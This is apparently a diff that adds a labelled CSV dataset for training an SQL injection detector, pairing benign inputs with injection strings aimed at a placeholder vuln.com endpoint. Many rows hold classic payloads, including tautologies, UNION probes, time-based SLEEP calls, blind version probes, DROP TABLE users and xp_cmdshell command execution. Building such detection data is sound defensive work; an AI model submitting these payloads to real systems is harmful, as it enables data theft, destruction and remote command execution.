@@ -1,0 +1,1001 @@
+url,param,value,label
+http://vuln.com/api,input,' OR 1=1/*366,1
+http://vuln.com/api,input,' OR 1=1#476,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --246",1
+http://vuln.com/api,input,hello123302,0
+http://vuln.com/api,input,contact_us11,0
+http://vuln.com/api,input,' OR 1=1#277,1
+http://vuln.com/api,input,search_item169,0
+http://vuln.com/api,input,' OR NOT 1=2 --23,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --124,1
+http://vuln.com/api,input,product_list466,0
+http://vuln.com/api,input,logout251,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--310,1
+http://vuln.com/api,input,' OR NOT 1=2 --318,1
+http://vuln.com/api,input,contact_us19,0
+http://vuln.com/api,input,feedback_form111,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --28",1
+http://vuln.com/api,input,feedback_form277,0
+http://vuln.com/api,input,' OR 1=1 --238,1
+http://vuln.com/api,input,invoice_2024423,0
+http://vuln.com/api,input,' OR NOT 1=2 --322,1
+http://vuln.com/api,input,' OR '' = ''93,1
+http://vuln.com/api,input,' OR 1=1#88,1
+http://vuln.com/api,input,john25,0
+http://vuln.com/api,input,search_item287,0
+http://vuln.com/api,input,' OR 1=1/*331,1
+http://vuln.com/api,input,' OR 1=1 --307,1
+http://vuln.com/api,input,admin227,0
+http://vuln.com/api,input,export_data373,0
+http://vuln.com/api,input,admin83,0
+http://vuln.com/api,input,search_item284,0
+http://vuln.com/api,input,export_data324,0
+http://vuln.com/api,input,download_report438,0
+http://vuln.com/api,input,update_profile182,0
+http://vuln.com/api,input,' OR '' = ''37,1
+http://vuln.com/api,input,email=admin@example.com164,0
+http://vuln.com/api,input,letmein290,0
+http://vuln.com/api,input,feedback_form167,0
+http://vuln.com/api,input,' OR 1=1/*97,1
+http://vuln.com/api,input,'; DROP TABLE users; --438,1
+http://vuln.com/api,input,email=admin@example.com73,0
+http://vuln.com/api,input,product_list79,0
+http://vuln.com/api,input,contact_us53,0
+http://vuln.com/api,input,john276,0
+http://vuln.com/api,input,admin355,0
+http://vuln.com/api,input,john56,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--225,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --196",1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --193",1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --349",1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --132,1
+http://vuln.com/api,input,product_list223,0
+http://vuln.com/api,input,feedback_form335,0
+http://vuln.com/api,input,' OR 1=1/*90,1
+http://vuln.com/api,input,invoice_2024286,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--7,1
+http://vuln.com/api,input,' AND SLEEP(5); --446,1
+http://vuln.com/api,input,' AND SLEEP(5); --415,1
+http://vuln.com/api,input,letmein116,0
+http://vuln.com/api,input,john362,0
+http://vuln.com/api,input,letmein319,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --63,1
+http://vuln.com/api,input,email=admin@example.com499,0
+http://vuln.com/api,input,' OR 1=1#156,1
+http://vuln.com/api,input,'; DROP TABLE users; --155,1
+http://vuln.com/api,input,' OR NOT 1=2 --420,1
+http://vuln.com/api,input,' OR 1=1 --249,1
+http://vuln.com/api,input,export_data51,0
+http://vuln.com/api,input,' OR 'a'='a1,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --276,1
+http://vuln.com/api,input,invoice_2024424,0
+http://vuln.com/api,input,' OR 1=1 --473,1
+http://vuln.com/api,input,hello123115,0
+http://vuln.com/api,input,contact_us8,0
+http://vuln.com/api,input,' OR NOT 1=2 --353,1
+http://vuln.com/api,input,admin256,0
+http://vuln.com/api,input,contact_us50,0
+http://vuln.com/api,input,download_report491,0
+http://vuln.com/api,input,' AND SLEEP(5); --442,1
+http://vuln.com/api,input,' OR 1=1 --223,1
+http://vuln.com/api,input,contact_us131,0
+http://vuln.com/api,input,reset_password181,0
+http://vuln.com/api,input,email=admin@example.com351,0
+http://vuln.com/api,input,admin' --251,1
+http://vuln.com/api,input,search_item377,0
+http://vuln.com/api,input,' OR 1=1#456,1
+http://vuln.com/api,input,export_data7,0
+http://vuln.com/api,input,john372,0
+http://vuln.com/api,input,admin221,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--165,1
+http://vuln.com/api,input,' OR 1=1/*179,1
+http://vuln.com/api,input,' OR 1=1 --119,1
+http://vuln.com/api,input,' OR 1=1#417,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--319,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--300,1
+http://vuln.com/api,input,letmein384,0
+http://vuln.com/api,input,admin266,0
+http://vuln.com/api,input,admin196,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --329,1
+http://vuln.com/api,input,search_item96,0
+http://vuln.com/api,input,' OR '' = ''30,1
+http://vuln.com/api,input,search_item49,0
+http://vuln.com/api,input,' OR 'a'='a200,1
+http://vuln.com/api,input,'; DROP TABLE users; --253,1
+http://vuln.com/api,input,john399,0
+http://vuln.com/api,input,' OR NOT 1=2 --296,1
+http://vuln.com/api,input,invoice_2024233,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --443",1
+http://vuln.com/api,input,product_list55,0
+http://vuln.com/api,input,admin' --144,1
+http://vuln.com/api,input,' OR NOT 1=2 --387,1
+http://vuln.com/api,input,export_data332,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --68",1
+http://vuln.com/api,input,search_item207,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--274,1
+http://vuln.com/api,input,logout275,0
+http://vuln.com/api,input,download_report217,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --176,1
+http://vuln.com/api,input,feedback_form118,0
+http://vuln.com/api,input,logout431,0
+http://vuln.com/api,input,feedback_form126,0
+http://vuln.com/api,input,reset_password82,0
+http://vuln.com/api,input,search_item374,0
+http://vuln.com/api,input,update_profile145,0
+http://vuln.com/api,input,email=admin@example.com42,0
+http://vuln.com/api,input,invoice_2024394,0
+http://vuln.com/api,input,export_data120,0
+http://vuln.com/api,input,invoice_2024299,0
+http://vuln.com/api,input,'; DROP TABLE users; --153,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --83",1
+http://vuln.com/api,input,' OR 'a'='a255,1
+http://vuln.com/api,input,invoice_2024250,0
+http://vuln.com/api,input,' AND SLEEP(5); --27,1
+http://vuln.com/api,input,'; DROP TABLE users; --110,1
+http://vuln.com/api,input,admin' --382,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --194,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--330,1
+http://vuln.com/api,input,' OR 1=1 --248,1
+http://vuln.com/api,input,' OR 1=1/*397,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --158,1
+http://vuln.com/api,input,' OR 1=1/*191,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --233,1
+http://vuln.com/api,input,invoice_202454,0
+http://vuln.com/api,input,feedback_form244,0
+http://vuln.com/api,input,' OR 1=1 --130,1
+http://vuln.com/api,input,logout13,0
+http://vuln.com/api,input,' OR 1=1/*459,1
+http://vuln.com/api,input,admin' --54,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--245,1
+http://vuln.com/api,input,product_list269,0
+http://vuln.com/api,input,' AND SLEEP(5); --183,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --383,1
+http://vuln.com/api,input,update_profile279,0
+http://vuln.com/api,input,' OR 1=1/*467,1
+http://vuln.com/api,input,letmein408,0
+http://vuln.com/api,input,' OR '' = ''199,1
+http://vuln.com/api,input,email=admin@example.com37,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--342,1
+http://vuln.com/api,input,contact_us293,0
+http://vuln.com/api,input,' AND SLEEP(5); --188,1
+http://vuln.com/api,input,hello123367,0
+http://vuln.com/api,input,hello123114,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--149,1
+http://vuln.com/api,input,contact_us323,0
+http://vuln.com/api,input,reset_password404,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--375,1
+http://vuln.com/api,input,search_item418,0
+http://vuln.com/api,input,update_profile411,0
+http://vuln.com/api,input,' OR 1=1 --290,1
+http://vuln.com/api,input,logout97,0
+http://vuln.com/api,input,feedback_form52,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --9,1
+http://vuln.com/api,input,contact_us171,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--447,1
+http://vuln.com/api,input,' OR 'a'='a32,1
+http://vuln.com/api,input,product_list18,0
+http://vuln.com/api,input,logout206,0
+http://vuln.com/api,input,product_list437,0
+http://vuln.com/api,input,reset_password471,0
+http://vuln.com/api,input,update_profile262,0
+http://vuln.com/api,input,invoice_2024304,0
+http://vuln.com/api,input,' OR 1=1/*189,1
+http://vuln.com/api,input,' OR 1=1#427,1
+http://vuln.com/api,input,search_item480,0
+http://vuln.com/api,input,' OR 1=1 --78,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--481,1
+http://vuln.com/api,input,feedback_form350,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --494",1
+http://vuln.com/api,input,search_item29,0
+http://vuln.com/api,input,feedback_form353,0
+http://vuln.com/api,input,' AND SLEEP(5); --454,1
+http://vuln.com/api,input,' AND SLEEP(5); --244,1
+http://vuln.com/api,input,' AND SLEEP(5); --170,1
+http://vuln.com/api,input,reset_password320,0
+http://vuln.com/api,input,' OR NOT 1=2 --348,1
+http://vuln.com/api,input,john184,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --286",1
+http://vuln.com/api,input,reset_password108,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--493,1
+http://vuln.com/api,input,letmein228,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --268",1
+http://vuln.com/api,input,search_item80,0
+http://vuln.com/api,input,john71,0
+http://vuln.com/api,input,letmein197,0
+http://vuln.com/api,input,'; DROP TABLE users; --461,1
+http://vuln.com/api,input,' OR NOT 1=2 --408,1
+http://vuln.com/api,input,invoice_2024450,0
+http://vuln.com/api,input,logout295,0
+http://vuln.com/api,input,' OR 'a'='a115,1
+http://vuln.com/api,input,' OR '' = ''62,1
+http://vuln.com/api,input,export_data33,0
+http://vuln.com/api,input,hello1233,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--292,1
+http://vuln.com/api,input,invoice_2024427,0
+http://vuln.com/api,input,invoice_2024414,0
+http://vuln.com/api,input,update_profile100,0
+http://vuln.com/api,input,update_profile135,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --332,1
+http://vuln.com/api,input,update_profile208,0
+http://vuln.com/api,input,logout463,0
+http://vuln.com/api,input,contact_us143,0
+http://vuln.com/api,input,' OR 1=1#345,1
+http://vuln.com/api,input,export_data500,0
+http://vuln.com/api,input,download_report195,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--171,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --64",1
+http://vuln.com/api,input,search_item378,0
+http://vuln.com/api,input,hello123179,0
+http://vuln.com/api,input,export_data341,0
+http://vuln.com/api,input,john268,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --5,1
+http://vuln.com/api,input,' OR 1=1 --65,1
+http://vuln.com/api,input,' AND SLEEP(5); --82,1
+http://vuln.com/api,input,export_data280,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--26,1
+http://vuln.com/api,input,download_report63,0
+http://vuln.com/api,input,admin383,0
+http://vuln.com/api,input,reset_password15,0
+http://vuln.com/api,input,' OR 1=1#485,1
+http://vuln.com/api,input,search_item81,0
+http://vuln.com/api,input,' AND SLEEP(5); --4,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --117,1
+http://vuln.com/api,input,invoice_20246,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --411,1
+http://vuln.com/api,input,' AND SLEEP(5); --139,1
+http://vuln.com/api,input,'; DROP TABLE users; --136,1
+http://vuln.com/api,input,'; DROP TABLE users; --177,1
+http://vuln.com/api,input,' OR 1=1#430,1
+http://vuln.com/api,input,admin' --187,1
+http://vuln.com/api,input,reset_password34,0
+http://vuln.com/api,input,admin' --11,1
+http://vuln.com/api,input,'; DROP TABLE users; --455,1
+http://vuln.com/api,input,contact_us343,0
+http://vuln.com/api,input,reset_password38,0
+http://vuln.com/api,input,export_data461,0
+http://vuln.com/api,input,'; DROP TABLE users; --272,1
+http://vuln.com/api,input,download_report122,0
+http://vuln.com/api,input,' AND SLEEP(5); --6,1
+http://vuln.com/api,input,email=admin@example.com129,0
+http://vuln.com/api,input,invoice_2024241,0
+http://vuln.com/api,input,john445,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--321,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --104",1
+http://vuln.com/api,input,export_data401,0
+http://vuln.com/api,input,' AND SLEEP(5); --265,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--24,1
+http://vuln.com/api,input,'; DROP TABLE users; --466,1
+http://vuln.com/api,input,letmein281,0
+http://vuln.com/api,input,' OR 1=1/*125,1
+http://vuln.com/api,input,feedback_form402,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--69,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --463,1
+http://vuln.com/api,input,' OR 1=1#444,1
+http://vuln.com/api,input,email=admin@example.com481,0
+http://vuln.com/api,input,' OR '' = ''164,1
+http://vuln.com/api,input,letmein76,0
+http://vuln.com/api,input,update_profile310,0
+http://vuln.com/api,input,feedback_form216,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --79",1
+http://vuln.com/api,input,invoice_2024175,0
+http://vuln.com/api,input,' OR 1=1#407,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--289,1
+http://vuln.com/api,input,download_report27,0
+http://vuln.com/api,input,' OR 'a'='a316,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --8,1
+http://vuln.com/api,input,letmein212,0
+http://vuln.com/api,input,email=admin@example.com321,0
+http://vuln.com/api,input,invoice_2024440,0
+http://vuln.com/api,input,' OR '' = ''351,1
+http://vuln.com/api,input,export_data91,0
+http://vuln.com/api,input,feedback_form204,0
+http://vuln.com/api,input,' OR '' = ''17,1
+http://vuln.com/api,input,'; DROP TABLE users; --13,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --108,1
+http://vuln.com/api,input,'; DROP TABLE users; --282,1
+http://vuln.com/api,input,feedback_form234,0
+http://vuln.com/api,input,download_report342,0
+http://vuln.com/api,input,' OR '' = ''367,1
+http://vuln.com/api,input,' OR NOT 1=2 --495,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--180,1
+http://vuln.com/api,input,invoice_2024132,0
+http://vuln.com/api,input,logout407,0
+http://vuln.com/api,input,' OR 1=1 --56,1
+http://vuln.com/api,input,contact_us243,0
+http://vuln.com/api,input,hello123278,0
+http://vuln.com/api,input,admin' --275,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --399,1
+http://vuln.com/api,input,logout263,0
+http://vuln.com/api,input,search_item476,0
+http://vuln.com/api,input,logout315,0
+http://vuln.com/api,input,john380,0
+http://vuln.com/api,input,admin' --219,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --357,1
+http://vuln.com/api,input,' OR 1=1#86,1
+http://vuln.com/api,input,admin17,0
+http://vuln.com/api,input,reset_password439,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --33",1
+http://vuln.com/api,input,letmein133,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --169",1
+http://vuln.com/api,input,contact_us291,0
+http://vuln.com/api,input,reset_password172,0
+http://vuln.com/api,input,hello12344,0
+http://vuln.com/api,input,download_report386,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --192",1
+http://vuln.com/api,input,' OR 'a'='a261,1
+http://vuln.com/api,input,email=admin@example.com103,0
+http://vuln.com/api,input,search_item326,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --106",1
+http://vuln.com/api,input,email=admin@example.com336,0
+http://vuln.com/api,input,email=admin@example.com74,0
+http://vuln.com/api,input,contact_us188,0
+http://vuln.com/api,input,export_data300,0
+http://vuln.com/api,input,update_profile316,0
+http://vuln.com/api,input,export_data253,0
+http://vuln.com/api,input,update_profile255,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --147,1
+http://vuln.com/api,input,hello123452,0
+http://vuln.com/api,input,logout189,0
+http://vuln.com/api,input,export_data415,0
+http://vuln.com/api,input,' AND SLEEP(5); --462,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --210,1
+http://vuln.com/api,input,' OR 'a'='a95,1
+http://vuln.com/api,input,' OR NOT 1=2 --497,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --57",1
+http://vuln.com/api,input,contact_us487,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --372,1
+http://vuln.com/api,input,' OR 1=1/*99,1
+http://vuln.com/api,input,' OR 1=1 --437,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --161",1
+http://vuln.com/api,input,' OR 1=1#212,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --186",1
+http://vuln.com/api,input,' OR 'a'='a29,1
+http://vuln.com/api,input,download_report494,0
+http://vuln.com/api,input,search_item361,0
+http://vuln.com/api,input,download_report65,0
+http://vuln.com/api,input,' AND SLEEP(5); --436,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --313,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --402,1
+http://vuln.com/api,input,' OR 1=1 --42,1
+http://vuln.com/api,input,search_item246,0
+http://vuln.com/api,input,admin432,0
+http://vuln.com/api,input,invoice_202435,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --114",1
+http://vuln.com/api,input,reset_password10,0
+http://vuln.com/api,input,export_data12,0
+http://vuln.com/api,input,' OR NOT 1=2 --452,1
+http://vuln.com/api,input,export_data62,0
+http://vuln.com/api,input,export_data48,0
+http://vuln.com/api,input,john387,0
+http://vuln.com/api,input,john130,0
+http://vuln.com/api,input,hello123403,0
+http://vuln.com/api,input,admin138,0
+http://vuln.com/api,input,feedback_form59,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --52,1
+http://vuln.com/api,input,download_report419,0
+http://vuln.com/api,input,' OR '' = ''431,1
+http://vuln.com/api,input,download_report360,0
+http://vuln.com/api,input,email=admin@example.com292,0
+http://vuln.com/api,input,export_data344,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--270,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --314",1
+http://vuln.com/api,input,admin' --336,1
+http://vuln.com/api,input,' OR 1=1#120,1
+http://vuln.com/api,input,export_data303,0
+http://vuln.com/api,input,'; DROP TABLE users; --474,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--22,1
+http://vuln.com/api,input,contact_us465,0
+http://vuln.com/api,input,product_list134,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --395",1
+http://vuln.com/api,input,download_report191,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --197,1
+http://vuln.com/api,input,search_item230,0
+http://vuln.com/api,input,hello123288,0
+http://vuln.com/api,input,download_report21,0
+http://vuln.com/api,input,invoice_2024457,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--419,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --299",1
+http://vuln.com/api,input,contact_us413,0
+http://vuln.com/api,input,search_item462,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --309",1
+http://vuln.com/api,input,search_item331,0
+http://vuln.com/api,input,product_list313,0
+http://vuln.com/api,input,logout144,0
+http://vuln.com/api,input,admin' --46,1
+http://vuln.com/api,input,john201,0
+http://vuln.com/api,input,update_profile222,0
+http://vuln.com/api,input,' OR NOT 1=2 --441,1
+http://vuln.com/api,input,'; DROP TABLE users; --498,1
+http://vuln.com/api,input,' OR 1=1#380,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --390",1
+http://vuln.com/api,input,logout412,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --237,1
+http://vuln.com/api,input,' OR 'a'='a47,1
+http://vuln.com/api,input,search_item312,0
+http://vuln.com/api,input,letmein338,0
+http://vuln.com/api,input,admin77,0
+http://vuln.com/api,input,product_list156,0
+http://vuln.com/api,input,reset_password160,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --400,1
+http://vuln.com/api,input,email=admin@example.com121,0
+http://vuln.com/api,input,update_profile456,0
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--39,1
+http://vuln.com/api,input,' OR 1=1#451,1
+http://vuln.com/api,input,' OR 1=1/*440,1
+http://vuln.com/api,input,' OR 1=1 --146,1
+http://vuln.com/api,input,'; DROP TABLE users; --34,1
+http://vuln.com/api,input,' OR NOT 1=2 --234,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --107,1
+http://vuln.com/api,input,email=admin@example.com99,0
+http://vuln.com/api,input,search_item264,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --423,1
+http://vuln.com/api,input,letmein435,0
+http://vuln.com/api,input,contact_us87,0
+http://vuln.com/api,input,' OR 'a'='a217,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--346,1
+http://vuln.com/api,input,product_list105,0
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --162",1
+http://vuln.com/api,input,'; DROP TABLE users; --355,1
+http://vuln.com/api,input,invoice_2024192,0
+http://vuln.com/api,input,' OR 1=1/*35,1
+http://vuln.com/api,input,' OR 'a'='a315,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --337",1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --484",1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--371,1
+http://vuln.com/api,input,' OR 1=1/*306,1
+http://vuln.com/api,input,' OR NOT 1=2 --121,1
+http://vuln.com/api,input,' OR NOT 1=2 --138,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--469,1
+http://vuln.com/api,input,' AND SLEEP(5); --205,1
+http://vuln.com/api,input,feedback_form239,0
+http://vuln.com/api,input,logout298,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --229,1
+http://vuln.com/api,input,logout236,0
+http://vuln.com/api,input,download_report209,0
+http://vuln.com/api,input,export_data117,0
+http://vuln.com/api,input,' OR NOT 1=2 --297,1
+http://vuln.com/api,input,search_item110,0
+http://vuln.com/api,input,' OR 'a'='a457,1
+http://vuln.com/api,input,admin474,0
+http://vuln.com/api,input,' OR 1=1#133,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --291",1
+http://vuln.com/api,input,logout368,0
+http://vuln.com/api,input,feedback_form410,0
+http://vuln.com/api,input,' OR 1=1 --398,1
+http://vuln.com/api,input,'; DROP TABLE users; --45,1
+http://vuln.com/api,input,' OR 1=1/*70,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --81,1
+http://vuln.com/api,input,export_data107,0
+http://vuln.com/api,input,logout333,0
+http://vuln.com/api,input,admin' --85,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --435",1
+http://vuln.com/api,input,update_profile31,0
+http://vuln.com/api,input,' UNION ALL SELECT NULL--460,1
+http://vuln.com/api,input,' OR NOT 1=2 --370,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --428,1
+http://vuln.com/api,input,feedback_form148,0
+http://vuln.com/api,input,' OR NOT 1=2 --323,1
+http://vuln.com/api,input,update_profile249,0
+http://vuln.com/api,input,hello123379,0
+http://vuln.com/api,input,' OR '' = ''369,1
+http://vuln.com/api,input,admin301,0
+http://vuln.com/api,input,' OR 'a'='a488,1
+http://vuln.com/api,input,invoice_2024473,0
+http://vuln.com/api,input,feedback_form75,0
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --80",1
+http://vuln.com/api,input,' OR 1=1 --160,1
+http://vuln.com/api,input,hello123152,0
+http://vuln.com/api,input,search_item492,0
+http://vuln.com/api,input,download_report163,0
+http://vuln.com/api,input,' OR 1=1/*48,1
+http://vuln.com/api,input,' OR '' = ''100,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--250,1
+http://vuln.com/api,input,email=admin@example.com497,0
+http://vuln.com/api,input,' OR NOT 1=2 --20,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --433",1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--487,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--230,1
+http://vuln.com/api,input,' OR 1=1 --450,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --66",1
+http://vuln.com/api,input,letmein22,0
+http://vuln.com/api,input,contact_us199,0
+http://vuln.com/api,input,' OR 1=1 --198,1
+http://vuln.com/api,input,update_profile112,0
+http://vuln.com/api,input,email=admin@example.com185,0
+http://vuln.com/api,input,invoice_202469,0
+http://vuln.com/api,input,invoice_2024475,0
+http://vuln.com/api,input,' OR '' = ''102,1
+http://vuln.com/api,input,logout139,0
+http://vuln.com/api,input,' OR 'a'='a201,1
+http://vuln.com/api,input,' OR 'a'='a352,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --491",1
+http://vuln.com/api,input,'; DROP TABLE users; --326,1
+http://vuln.com/api,input,' OR '' = ''148,1
+http://vuln.com/api,input,contact_us359,0
+http://vuln.com/api,input,reset_password441,0
+http://vuln.com/api,input,' OR 'a'='a258,1
+http://vuln.com/api,input,' AND SLEEP(5); --98,1
+http://vuln.com/api,input,logout485,0
+http://vuln.com/api,input,' OR 'a'='a449,1
+http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --448",1
+http://vuln.com/api,input,' OR 'a'='a221,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --173,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --279,1
+http://vuln.com/api,input,'; DROP TABLE users; --424,1
+http://vuln.com/api,input,contact_us127,0
+http://vuln.com/api,input,' OR 1=1#55,1
+http://vuln.com/api,input,letmein70,0
+http://vuln.com/api,input,' OR 1=1#51,1
+http://vuln.com/api,input,admin' --489,1
+http://vuln.com/api,input,update_profile64,0
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --360,1
+http://vuln.com/api,input,' OR 1=1 --267,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--204,1
+http://vuln.com/api,input,hello12361,0
+http://vuln.com/api,input,email=admin@example.com16,0
+http://vuln.com/api,input,' OR 'a'='a458,1
+http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --324,1
+http://vuln.com/api,input,'; DROP TABLE users; --14,1
+http://vuln.com/api,input,invoice_2024106,0
+http://vuln.com/api,input,' OR '' = ''453,1
+http://vuln.com/api,input,product_list388,0
+http://vuln.com/api,input,'; DROP TABLE users; --25,1
+http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --72",1
+http://vuln.com/api,input,admin318,0
+http://vuln.com/api,input,' OR 1=1 --195,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--284,1
+http://vuln.com/api,input,' OR 1=1/*335,1
+http://vuln.com/api,input,logout168,0
+http://vuln.com/api,input,product_list26,0
+http://vuln.com/api,input,update_profile265,0
+http://vuln.com/api,input,' OR 1=1/*434,1
+http://vuln.com/api,input,letmein68,0
+http://vuln.com/api,input,admin' --285,1
+http://vuln.com/api,input,logout274,0
+http://vuln.com/api,input,admin468,0
+http://vuln.com/api,input,export_data200,0
+http://vuln.com/api,input,download_report358,0
+http://vuln.com/api,input,' OR NOT 1=2 --15,1
+http://vuln.com/api,input,product_list215,0
+http://vuln.com/api,input,letmein66,0
+http://vuln.com/api,input,' OR 'a'='a44,1
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --418,1
+http://vuln.com/api,input,' OR 1=1 ORDER BY 1--259,1
+http://vuln.com/api,input,reset_password454,0
+http://vuln.com/api,input,feedback_form210,0
+http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --283,1
+http://vuln.com/api,input,' OR NOT 1=2 --131,1
+http://vuln.com/api,input,export_data425,0
+http://vuln.com/api,input,' OR 1=1 --410,1
+http://vuln.com/api,input,' OR '' = ''486,1
+http://vuln.com/api,input,' UNION ALL SELECT NULL--203,1
+http://vuln.com/api,input,invoice_202420,0
+http://vuln.com/api,input,' OR '' = ''350,1
+http://vuln.com/api,input,letmein483,0
+http://vuln.com/api,input,admin325,0
+http://vuln.com/api,input,' OR 'a'='a358,1
+http://vuln.com/api,input,admin' --214,1
+http://vuln.com/api,input,email=admin@example.com57,0
+http://vuln.com/api,input,' OR NOT 1=2 --224,1
+http://vuln.com/api,input,'; DROP TABLE users; --226,1
+http://vuln.com/api,input,admin' --94,1
